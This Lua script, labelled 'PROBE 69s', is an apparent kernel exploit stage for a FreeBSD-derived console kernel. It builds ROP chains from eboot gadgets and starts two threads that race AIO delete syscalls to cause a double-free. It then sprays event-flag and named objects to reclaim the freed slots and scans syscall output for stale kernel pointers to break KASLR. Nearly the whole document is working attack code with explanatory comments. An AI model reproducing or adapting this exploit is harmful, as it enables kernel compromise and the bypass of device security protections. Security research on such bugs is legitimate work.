-- CRASH_CLASS: HIGH
-- PROBE 69s: Full-chain KASLR leak via AIO double-free + cross-type reclaim
--
-- Context: The decompile verification (VERIFICATION_DECOMPILE.md) proved
-- R+0x00 = curthread+0x390 and R+0x08 = curthread+0x08 — kernel thread
-- addresses that survive free to zone 0x1ab59e0. Only R+0x10 is zeroed.
-- If we can reclaim R's freed zone slot with a cross-type object that
-- provides readback, we can leak those stale kernel pointers.
--
-- DANGER: entry_dispose does lock xadd on *(R+0x00)+0x28. If the reclaiming
-- object overwrites R+0x00 with a non-kernel address, the xadd will fault
-- in kernel mode → PANIC. So this probe only reads, never triggers dispose
-- on potentially reclaimed slots.
--
-- Chain:
-- 1. Submit + poll 32 AIO requests (create R objects)
-- 2. Double-free race: two child threads call 662 concurrently
-- 3. Spray: create 1000 EVF objects + 500 namedobj (target R's zone)
-- 4. Submit 32 NEW AIO requests (new R objects may land on reclaimed memory)
-- 5. Read back via 664/666/667 — check for kernel pointer contamination
-- 6. DO NOT delete the new IDs (avoid entry_dispose on corrupted objects)

print("=== PROBE 69s: FULL-CHAIN KASLR VIA AIO DOUBLE-FREE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local fn_addr_val = N(stub)
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eboot_lo = rd(N(info) + 0x108) or 0
local eboot_hi = rd(N(info) + 0x10C) or 0
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot_base=" .. fmt(eboot_base))

-- Gadgets
local pop_rax_ret = uint64(N(eboot_base) + 0x992)
local pop_rdi_ret = uint64(N(eboot_base) + 0xC9DFE)
local pop_rsi_ret = uint64(N(eboot_base) + 0xD77D)
local pop_rdx_ret = uint64(N(eboot_base) + 0x3B02D7)
local pop_rcx_ret = uint64(N(eboot_base) + 0xE64)
local bare_ret    = uint64(N(eboot_base) + 0x42)
local mov_rdi_rax = uint64(N(eboot_base) + 0x92C67)
local jmp_self    = uint64(N(eboot_base) + 0x42)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("FAIL: no /dev/zero"); return end

-- ============================================================
-- AIO helpers
-- ============================================================
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one()
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    return rd(N(id_buf)) or 0
end

-- ============================================================
-- [A] Submit and poll 32 AIO requests (create R objects)
-- ============================================================
print("")
print("[A] Submitting 32 AIO requests for double-free")
local target_ids = {}
for i = 1, 32 do
    local id = submit_one()
    if id ~= 0 then table.insert(target_ids, id) end
end
print("  submitted: " .. #target_ids)
if #target_ids < 16 then print("FAIL: too few IDs"); return end

-- Poll all
local poll_buf = memory.alloc(#target_ids * 4 + 8)
local poll_st = memory.alloc(#target_ids * 4 + 8)
for i = 1, #target_ids do
    wd(N(poll_buf) + (i - 1) * 4, target_ids[i])
    wd(N(poll_st) + (i - 1) * 4, 0xDEAD)
end
pcall(function()
    mk(664)(uint64(N(poll_buf)), uint64(#target_ids), uint64(N(poll_st)))
end)
print("  polled all " .. #target_ids .. " IDs")

if not alive() then print("DEAD after submit"); return end

-- ============================================================
-- [B] Create gate socketpair for synchronized release
-- ============================================================
print("")
print("[B] Setting up child thread race")

local gate_sv = memory.alloc(8)
wd(N(gate_sv), 0xFFFFFFFF); wd(N(gate_sv) + 4, 0xFFFFFFFF)
pcall(function()
    mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(gate_sv)))
end)
local gate_r = rd(N(gate_sv)) or -1
local gate_w = rd(N(gate_sv) + 4) or -1
print("  gate fds: r=" .. gate_r .. " w=" .. gate_w)
if gate_r < 0 then print("FAIL: no gate socketpair"); return end

-- Signal socketpairs for children to report completion
local sig1_sv = memory.alloc(8)
wd(N(sig1_sv), 0xFFFFFFFF); wd(N(sig1_sv) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sig1_sv))) end)
local sig1_r = rd(N(sig1_sv)) or -1
local sig1_w = rd(N(sig1_sv) + 4) or -1

local sig2_sv = memory.alloc(8)
wd(N(sig2_sv), 0xFFFFFFFF); wd(N(sig2_sv) + 4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sig2_sv))) end)
local sig2_r = rd(N(sig2_sv)) or -1
local sig2_w = rd(N(sig2_sv) + 4) or -1

print("  sig1 fds: r=" .. sig1_r .. " w=" .. sig1_w)
print("  sig2 fds: r=" .. sig2_r .. " w=" .. sig2_w)

-- ============================================================
-- [C] Build child thread ROP chains for 662 call
-- ============================================================
-- Each child: sysarch(129, &tcb) → read(gate_r, 1B) → 662(ids, count, states) → write(sig_w, 1B) → park

local function build_delete_chain(child_gate_r, child_sig_w, ids_ptr, count, states_ptr)
    local stack_size = 0x200000
    local stack = memory.alloc(stack_size)
    local tcb = memory.alloc(0x1000)
    local tcb_ptr_loc = memory.alloc(8)
    wq(N(tcb), uint64(N(tcb)))
    wq(N(tcb_ptr_loc), uint64(N(tcb)))

    local one_byte = memory.alloc(8)
    wd(N(one_byte), 0x41)

    local fn_addr = uint64(fn_addr_val)
    local rsp_top = math.floor((N(stack) + stack_size) / 16) * 16 - 8
    local pos = rsp_top

    local chain = {}
    local function push(val)
        table.insert(chain, {pos = pos, val = val})
        pos = pos - 8
    end

    -- Build chain in reverse (stack grows down, execution goes up)
    -- Last: park on jmp_self
    push(jmp_self)

    -- thr_exit(431): pop_rax → 431 → syscall
    push(fn_addr)        -- syscall;ret
    push(uint64(431))    -- rax = 431
    push(pop_rax_ret)

    -- write(sig_w, one_byte, 1): signal completion
    push(fn_addr)
    push(uint64(4))      -- rax = 4 (write)
    push(pop_rax_ret)
    push(uint64(1))      -- rdx = 1 (len)
    push(pop_rdx_ret)
    push(uint64(N(one_byte)))  -- rsi = buf
    push(pop_rsi_ret)
    push(uint64(child_sig_w))  -- rdi = fd
    push(pop_rdi_ret)

    -- 662(ids, count, states)
    push(fn_addr)
    push(uint64(662))
    push(pop_rax_ret)
    push(uint64(N(states_ptr)))  -- rdx = states
    push(pop_rdx_ret)
    push(uint64(count))          -- rsi = count
    push(pop_rsi_ret)
    push(uint64(N(ids_ptr)))     -- rdi = ids
    push(pop_rdi_ret)

    -- read(gate_r, one_byte, 1): block until gate opens
    push(fn_addr)
    push(uint64(3))      -- rax = 3 (read)
    push(pop_rax_ret)
    push(uint64(1))      -- rdx = 1
    push(pop_rdx_ret)
    push(uint64(N(one_byte)))  -- rsi = buf
    push(pop_rsi_ret)
    push(uint64(child_gate_r)) -- rdi = fd
    push(pop_rdi_ret)

    -- sysarch(129, &tcb_ptr_loc)
    push(fn_addr)
    push(uint64(165))    -- rax = 165 (sysarch)
    push(pop_rax_ret)
    push(uint64(N(tcb_ptr_loc)))  -- rsi = &tcb_ptr
    push(pop_rsi_ret)
    push(uint64(129))    -- rdi = SET_FSBASE
    push(pop_rdi_ret)

    -- Write chain to stack (reverse order so first instruction is at lowest address)
    for i = #chain, 1, -1 do
        wq(chain[i].pos, chain[i].val)
    end

    -- The entry point is the address of the first instruction
    local entry = chain[#chain].pos

    return stack, stack_size, entry
end

-- Shared ID array for both children
local race_ids = memory.alloc(#target_ids * 4 + 8)
for i = 1, #target_ids do
    wd(N(race_ids) + (i - 1) * 4, target_ids[i])
end
local race_st1 = memory.alloc(#target_ids * 4 + 8)
local race_st2 = memory.alloc(#target_ids * 4 + 8)
for i = 1, #target_ids do
    wd(N(race_st1) + (i - 1) * 4, 0xDEAD)
    wd(N(race_st2) + (i - 1) * 4, 0xDEAD)
end

local stack1, stsz1, entry1 = build_delete_chain(gate_r, sig1_w, race_ids, #target_ids, race_st1)
local stack2, stsz2, entry2 = build_delete_chain(gate_r, sig2_w, race_ids, #target_ids, race_st2)

-- ============================================================
-- [D] Launch children via thr_new(455)
-- ============================================================
print("")
print("[D] Launching race children")

local function launch_child(stack_ptr, stack_sz, entry_addr)
    local param = memory.alloc(0x40)
    wq(N(param) + 0x00, uint64(entry_addr))       -- start_func = entry ROP
    wq(N(param) + 0x08, uint64(0))                 -- arg (unused)
    wq(N(param) + 0x10, uint64(N(stack_ptr)))      -- stack_base
    wq(N(param) + 0x18, uint64(stack_sz))           -- stack_size
    wq(N(param) + 0x20, uint64(0))                  -- tls_base
    wq(N(param) + 0x28, uint64(0))                  -- tls_size
    local tid_out = memory.alloc(8)
    wd(N(tid_out), 0)
    wq(N(param) + 0x30, uint64(N(tid_out)))        -- child_tid

    local ret = nil
    pcall(function()
        ret = mk(455)(uint64(N(param)), uint64(0x38))
    end)
    local r = ret and sgn(ret) or -999
    local tid = rd(N(tid_out)) or 0
    return r, tid
end

local r1, tid1 = launch_child(stack1, stsz1, entry1)
local r2, tid2 = launch_child(stack2, stsz2, entry2)
print(string.format("  child1: ret=%d tid=%d", r1, tid1))
print(string.format("  child2: ret=%d tid=%d", r2, tid2))

if r1 ~= 0 or r2 ~= 0 then
    print("FAIL: child launch failed")
    return
end

if not alive() then print("DEAD after child launch"); return end

-- ============================================================
-- [E] Open the gate — both children race on 662
-- ============================================================
print("")
print("[E] Opening gate for double-free race")

-- Write 2 bytes to gate — both children unblock simultaneously
local gate_buf = memory.alloc(8)
wd(N(gate_buf), 0x4141)
pcall(function()
    native.fcall_with_rax(stub, 4, uint64(gate_w), uint64(N(gate_buf)), uint64(2))
end)

-- Wait for both children to signal completion (with timeout)
local wait_buf = memory.alloc(8)
local child1_done = false
local child2_done = false

for attempt = 1, 50000 do
    if not child1_done then
        -- Non-blocking read on sig1_r
        wd(N(wait_buf), 0)
        local r = nil
        pcall(function()
            -- Set FIONBIO on sig1_r
            local nb = memory.alloc(4)
            wd(N(nb), 1)
            mk(54)(uint64(sig1_r), uint64(0x8004667E), uint64(N(nb)))
            r = native.fcall_with_rax(stub, 3, uint64(sig1_r), uint64(N(wait_buf)), uint64(1))
        end)
        if r and sgn(r) == 1 then child1_done = true end
    end
    if not child2_done then
        wd(N(wait_buf), 0)
        local r = nil
        pcall(function()
            local nb = memory.alloc(4)
            wd(N(nb), 1)
            mk(54)(uint64(sig2_r), uint64(0x8004667E), uint64(N(nb)))
            r = native.fcall_with_rax(stub, 3, uint64(sig2_r), uint64(N(wait_buf)), uint64(1))
        end)
        if r and sgn(r) == 1 then child2_done = true end
    end
    if child1_done and child2_done then break end
end

print(string.format("  child1_done=%s child2_done=%s", tostring(child1_done), tostring(child2_done)))

if not alive() then print("DEAD after race"); return end

-- ============================================================
-- [F] Analyze race results — count double-deletes
-- ============================================================
print("")
print("[F] Race results")
local double_del = 0
local single_del = 0
local neither = 0
for i = 1, #target_ids do
    local s1 = rd(N(race_st1) + (i - 1) * 4) or 0xDEAD
    local s2 = rd(N(race_st2) + (i - 1) * 4) or 0xDEAD
    if s1 == 0 and s2 == 0 then
        double_del = double_del + 1
    elseif s1 == 0 or s2 == 0 then
        single_del = single_del + 1
    else
        neither = neither + 1
    end
end
print(string.format("  double_del=%d single_del=%d neither=%d / %d total",
    double_del, single_del, neither, #target_ids))

if double_del == 0 then
    print("  WARNING: no double-deletes in this race iteration")
    print("  (This is expected ~30% of the time. The KASLR check below")
    print("   still runs but is less likely to find anything.)")
end

-- ============================================================
-- [G] Spray phase: EVF + namedobj to reclaim freed R-object slots
-- ============================================================
print("")
print("[G] Spraying cross-type objects to reclaim freed zone slots")

local evf_handles = {}
for i = 1, 1000 do
    local name = put_str(string.format("ks_%04d", i))
    local ret = nil
    pcall(function()
        ret = mk(538)(uint64(N(name)), uint64(0xCAFE0000 + i))
    end)
    if ret and sgn(ret) >= 0 then
        table.insert(evf_handles, sgn(ret))
    end
end
print(string.format("  EVF created: %d", #evf_handles))

local nobj_handles = {}
for i = 1, 500 do
    -- 48-byte name to match R-object zone size (padded)
    local name = put_str(string.format("nk_%04d_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", i))
    local ret = nil
    pcall(function()
        ret = mk(557)(uint64(N(name)))
    end)
    if ret and sgn(ret) >= 0 then
        table.insert(nobj_handles, sgn(ret))
    end
end
print(string.format("  namedobj created: %d", #nobj_handles))

if not alive() then print("DEAD after spray"); return end

-- ============================================================
-- [H] Submit NEW AIO requests — R-objects may reclaim freed slots
-- ============================================================
print("")
print("[H] Submitting 32 NEW AIO requests (potential reclaim)")
local new_ids = {}
for i = 1, 32 do
    local id = submit_one()
    if id ~= 0 then table.insert(new_ids, id) end
end
print("  new IDs submitted: " .. #new_ids)

-- Poll new IDs
if #new_ids > 0 then
    local np = memory.alloc(#new_ids * 4 + 8)
    local ns = memory.alloc(#new_ids * 4 + 8)
    for i = 1, #new_ids do
        wd(N(np) + (i - 1) * 4, new_ids[i])
        wd(N(ns) + (i - 1) * 4, 0xDEAD)
    end
    pcall(function()
        mk(664)(uint64(N(np)), uint64(#new_ids), uint64(N(ns)))
    end)
    local p1 = rd(N(ns)) or 0xDEAD
    print(string.format("  polled, first status: 0x%X", p1))
end

if not alive() then print("DEAD after new submit"); return end

-- ============================================================
-- [I] KASLR readback: scan all outputs for kernel pointers
-- ============================================================
print("")
print("[I] KASLR readback via 664/666/667")

local kptrs_found = 0

for _, sc_num in ipairs({664, 666, 667}) do
    if not alive() then break end

    local out = memory.alloc(0x1000)
    for j = 0, 0xFFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local id_buf = memory.alloc(#new_ids * 4 + 8)
    for i = 1, #new_ids do
        wd(N(id_buf) + (i - 1) * 4, new_ids[i])
    end

    local ret = nil
    pcall(function()
        ret = mk(sc_num)(uint64(N(id_buf)), uint64(#new_ids), uint64(N(out)))
    end)
    local r = ret and sgn(ret) or -999

    -- Scan for kernel pointers and anomalous values
    local modified = 0
    local kptr_list = {}
    for j = 0, 0xFFC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then
            modified = modified + 1
            if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF then
                local prev = rd(N(out) + j - 4) or 0xCCCCCCCC
                table.insert(kptr_list, {off = j, val = v, prev = prev})
                kptrs_found = kptrs_found + 1
            end
        end
    end

    print(string.format("  %d: ret=%d modified=%d kptrs=%d",
        sc_num, r, modified, #kptr_list))

    for _, kp in ipairs(kptr_list) do
        print(string.format("    *** KERNEL POINTER at +0x%03X: hi=0x%08X lo=0x%08X ***",
            kp.off, kp.val, kp.prev))
    end

    -- Also check for spray sentinel contamination (EVF bits leaking into AIO status)
    for j = 0, 0xFFC, 4 do
        local v = rd(N(out) + j) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC and v ~= 0 and v ~= 3 and v ~= 4 then
            local vh = v
            if vh >= 0xCAFE0000 and vh <= 0xCAFE1000 then
                print(string.format("    *** EVF SENTINEL at +0x%03X: 0x%08X (spray reclaim!) ***",
                    j, v))
            end
        end
    end
end

if not alive() then print("DEAD after readback"); return end

-- ============================================================
-- [J] Also try 663 wait with the new IDs
-- ============================================================
print("")
print("[J] 663 wait readback")
do
    local out = memory.alloc(0x1000)
    for j = 0, 0xFFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

    local id_buf = memory.alloc(#new_ids * 4 + 8)
    for i = 1, #new_ids do
        wd(N(id_buf) + (i - 1) * 4, new_ids[i])
    end

    -- Try modes 0-3
    for mode = 0, 3 do
        if not alive() then break end
        for j = 0, 0xFFC, 4 do wd(N(out) + j, 0xCCCCCCCC) end

        local ret = nil
        pcall(function()
            ret = mk(663)(uint64(N(id_buf)), uint64(#new_ids), uint64(N(out)),
                uint64(0), uint64(mode), uint64(0))
        end)
        local r = ret and sgn(ret) or -999

        local modified = 0
        local kcount = 0
        for j = 0, 0xFFC, 4 do
            local v = rd(N(out) + j) or 0xCCCCCCCC
            if v ~= 0xCCCCCCCC then
                modified = modified + 1
                if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF then
                    kcount = kcount + 1
                    kptrs_found = kptrs_found + 1
                    print(string.format("    *** 663 mode=%d KPTR at +0x%03X: 0x%08X ***",
                        mode, j, v))
                end
            end
        end
        print(string.format("  663 mode=%d: ret=%d mod=%d kptrs=%d", mode, r, modified, kcount))
    end
end

-- ============================================================
-- [K] Summary
-- ============================================================
print("")
print("[K] SUMMARY")
print(string.format("  double-deletes: %d/%d", double_del, #target_ids))
print(string.format("  spray: %d EVF + %d namedobj", #evf_handles, #nobj_handles))
print(string.format("  new AIO: %d", #new_ids))
print(string.format("  KERNEL POINTERS FOUND: %d", kptrs_found))

if kptrs_found > 0 then
    print("")
    print("  *** KASLR LEAK DETECTED ***")
    print("  Cross-type reclaim exposed stale kernel thread pointers!")
else
    print("")
    print("  No kernel pointers in readback. Possible reasons:")
    print("  - Spray did not reclaim the right zone (size mismatch)")
    print("  - 664/666/667 only copy the status dword, not R+0x00/R+0x08")
    print("  - Double-free did not actually free R objects")
    print("  - Need higher spray volume to drain per-CPU cache")
end

-- Cleanup spray objects (safe — these are our spray, not AIO)
print("")
print("[L] Cleanup")
for _, h in ipairs(evf_handles) do
    pcall(function() mk(539)(uint64(h)) end)
end
for _, h in ipairs(nobj_handles) do
    pcall(function() mk(558)(uint64(h)) end)
end
-- NOTE: NOT deleting new_ids — entry_dispose on reclaimed slots could panic
print("  spray cleaned, new AIO IDs LEFT ALIVE (safe)")
print("  alive=" .. (alive() and "YES" or "NO"))

print("")
print("=== PROBE 69s COMPLETE ===")
